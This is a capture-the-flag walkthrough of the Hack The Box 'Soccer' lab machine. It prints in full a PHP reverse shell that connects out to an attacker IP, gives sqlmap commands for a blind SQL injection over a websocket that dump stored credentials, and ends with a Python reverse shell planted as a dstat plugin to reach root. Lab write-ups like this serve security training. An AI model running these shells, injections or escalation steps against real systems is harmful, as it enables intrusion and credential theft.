# Soccer HTB machine

**A machine with a web service that is created using a web based php file manager that has a path traversal vulnerability in the file upload functionality, and a subdomain, which is vulnerable to blind SQL Injection over websocket.**

After exploring the web page, we can do not find any entry point. Let's use gobuster tool to search for directories and files in the websites:

```
gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirb/big.txt
```

We found a directory named "tiny". Going to "http://soccer.htb/tiny/" will prompt us to a login page created with tiny file manager. Searching about this file manager, we find that the tiny file manager is a web based php file manager:

https://github.com/prasathmani/tinyfilemanager

We can find the default credentials to login, in the gihub page. The username is "admin" and the password is "admin@123".

After logging in, we can search about vulnerabilities of this file manager and we find that it has a path traversal vulnerability in the file upload functionality. This article explains the vulnerability:

https://nvd.nist.gov/vuln/detail/CVE-2021-45010

We can upload a malicious script in the file manager platform. We only have access to the "upload" folder of the "tiny" folder. Go to the following link, after logging in, and upload a reverse shell php script to achieve connection:

http://soccer.htb/tiny/tinyfilemanager.php?p=tiny%2Fuploads&upload

```
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.31';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {

 $pid = pcntl_fork();
 
 if ($pid == -1) {
  printit("ERROR: Can't fork");
  exit(1);
 }
 
 if ($pid) {
  exit(0);  
 }

 if (posix_setsid() == -1) {
  printit("Error: Can't setsid()");
  exit(1);
 }

 $daemon = 1;
} else {
 printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
 printit("$errstr ($errno)");
 exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  
   1 => array("pipe", "w"),  
   2 => array("pipe", "w")   
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
 printit("ERROR: Can't spawn shell");
 exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {

 if (feof($sock)) {
  printit("ERROR: Shell connection terminated");
  break;
 }

 if (feof($pipes[1])) {
  printit("ERROR: Shell process terminated");
  break;
 }

 $read_a = array($sock, $pipes[1], $pipes[2]);
 $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

 if (in_array($sock, $read_a)) {
  if ($debug) printit("SOCK READ");
  $input = fread($sock, $chunk_size);
  if ($debug) printit("SOCK: $input");
  fwrite($pipes[0], $input);
 }

 if (in_array($pipes[1], $read_a)) {
  if ($debug) printit("STDOUT READ");
  $input = fread($pipes[1], $chunk_size);
  if ($debug) printit("STDOUT: $input");
  fwrite($sock, $input);
 }

 if (in_array($pipes[2], $read_a)) {
  if ($debug) printit("STDERR READ");
  $input = fread($pipes[2], $chunk_size);
  if ($debug) printit("STDERR: $input");
  fwrite($sock, $input);
 }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
 if (!$daemon) {
  print "$string\n";
 }
}

?>
```

Make sure to change the ip and port values. Now, listen to the port using "nc -lvpn 4444" and go to "http://soccer.htb/tiny/uploads/reverse_shell.php" to execute the script and achieve remote connection.

Now, connection has been achieved. Let's execute "whoami" to check the username of the loggen in user. We see "www-data" is the username. Let's check the configurations of the nginx server, by executing "cd /etc/nginx/sites-enabled". We can find a file named "soc-player.htb" which means that there is a subdomain. We can add add soc-player.soccer.htb to /etc/hosts by adding this line to the end of the file "10.10.11.194 soc-player.soccer.htb". Now let's go to "http://soc-player.soccer.htb". After examinating the page, we see that there is a login functionality. After doing the signup process, we can login and see in the source code of the page that we have a ticket with a ticket id.

After analysing the source code, we see that it shows a javascript code that establish a new WebSocket connection to the server at the URL “ws://soc-player.soccer.htb:9091”. When the page is loaded, it sets up an event listener for when the user presses the “Enter” key in the input element with the ID “id”. When the “Enter” key is pressed, the function “sendText” is called. The “sendText” function is used to send a message to the server through the WebSocket connection. The message consists of a JSON object with a single property “id” and a value equal to the value of the input element.The code also has a function called “append”, which is called when the WebSocket connection receives a message from the server. The function takes the message as an argument and sets the text content of the “p” element to the message. The input parameter could be vulnerable to SQL injection. Let’s search information about SQL injections over websockets. We find an article that talks about blind SQL injections over websockets:

https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

In the article, we find the exploit script that provides a simple way to interact with the WebSocket server by sending and receiving data through HTTP GET requests, serving as a bridge between clients and the WebSocket server. We need to change the ws_server variable to "ws://soc-player.soccer.htb:9091". Run the script using "python3 exploit.py" and then run the sqlmap command to perform SQL injection:

```
sqlmap -u "http://localhost:8081/?id=1" -p "id" --dbs
```

You can substitute the "id=1" with the ticket number that you got, like this "id=<id_number>". The sqlmap commands may take a significant amount of running time. We get that there is a database called "soccer_db". Now, let's run:

```
sqlmap -u "http://localhost:8081/?id=1" -D soccer_db --dump
```

We get that there is a table named "accounts". Let's run the following command to see the contents of the table:
```
sqlmap -u "http://localhost:8081/?id=1" -D soccer_db -T accounts --dump
```

We see that there is a variable named username and a variable named password. Let's dump them:

```
sqlmap -u "http://localhost:8081/?id=1" -D soccer_db -T accounts -C username,password --dump
```

We get the following output from this command:

```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:32:30 /2023-04-16/

[15:32:30] [INFO] resuming back-end DBMS 'mysql' 
[15:32:30] [INFO] testing connection to the target URL
[15:32:32] [WARNING] turning off pre-connect mechanism because of incompatible server ('SimpleHTTP/0.6 Python/3.11.2')
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=51955 AND 2839=2839

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=51955 AND (SELECT 9167 FROM (SELECT(SLEEP(5)))FZoa)
---
[15:32:32] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[15:32:32] [INFO] fetching entries of column(s) 'password,username' for table 'accounts' in database 'soccer_db'
[15:32:32] [INFO] fetching number of column(s) 'password,username' entries for table 'accounts' in database 'soccer_db'
[15:32:32] [INFO] resumed: 1
[15:32:32] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:32:32] [INFO] retrieved: 
[15:33:33] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[15:33:54] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[15:34:05] [INFO] adjusting time delay to 1 second due to good response times
PlayerOftheMatch2022
[15:35:40] [INFO] retrieved: 
[15:35:42] [INFO] retrieved: player
Database: soccer_db
Table: accounts
[1 entry]
+----------+----------------------+
| username | password             |
+----------+----------------------+
| player   | PlayerOftheMatch2022 |
+----------+----------------------+

[15:36:13] [INFO] table 'soccer_db.accounts' dumped to CSV file '/root/.local/share/sqlmap/output/localhost/dump/soccer_db/accounts.csv'
[15:36:13] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'

[*] ending @ 15:36:13 /2023-04-16/
```

So, now we got the credentials of the player user, with username "player" and password "PlayerOftheMatch2022". Let's use ssh to login:

```
ssh player@10.10.11.194
```

After getting in, we can get the user flag. We can execute "sudo -l" to check the permissions of the user "player", but we see "Sorry, user player may not run sudo on localhost.".

Let's run the following command to see the files we have permission as "player" user.

```
find / -perm -u=s -type f 2> /dev/null
```

The command searches for files with the setuid (SUID) permission enabled in the entire file system starting from the root directory.

Here's a breakdown of the command:

- find: The command used to search for files and directories in Linux.

- /: The starting directory for the search, which is the root directory ("/") in this case.

- perm: The option to specify the permissions to match.

- u=s: The permission pattern to match, where "u" stands for "user" and "s" indicates the setuid permission. This pattern specifies that the files should have the setuid permission enabled.

- type f: The option to specify the type of files to search for, where "f" indicates regular files. This ensures that only regular files with the setuid permission are returned.

- 2> /dev/null: Redirects standard error (stderr) output to /dev/null, discarding any error messages that may occur during the search. This is done to suppress any error messages that may be generated when searching in directories where the user does not have sufficient permissions.

- /dev/null: A special device file in Linux that discards anything written to it, effectively sending it to oblivion. In this command, it is used to discard any error messages that may be generated during the search.

After executing the command, we find that we have the ability to see a file named doas.conf. Let's use "cat /usr/local/etc/doas.conf". We get "permit nopass player as root cmd /usr/bin/dstat". Let's check the dstat command by running "dstat --help". We can see the files we have permissions using:

```
find / -type d -name dstat -group player 2>/dev/null
```

This command searches for directories with the name "dstat" and owned by the group "player" in the entire file system starting from the root directory. The output of this command is "/usr/local/share/dstat". So let's go to this directory. We can create any file with format "dstat_<name>" and execute it through:
```
doas -u root /usr/bin/dstat --<name>
```

So, let's create the file dstat_exploit.py.

```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.31",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("bash")
```

This is a reverse shell script in python. Make sure to change the ip and port. Now, listen to the port with your pc using "nc -lvpn 4444". Execute the following command to establish connection as root user:

```
doas -u root /usr/bin/dstat --exploit
```

We get the following log:

```
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
```

Congrats! We connected as root user and we can display the root flag under the "/root" directory.
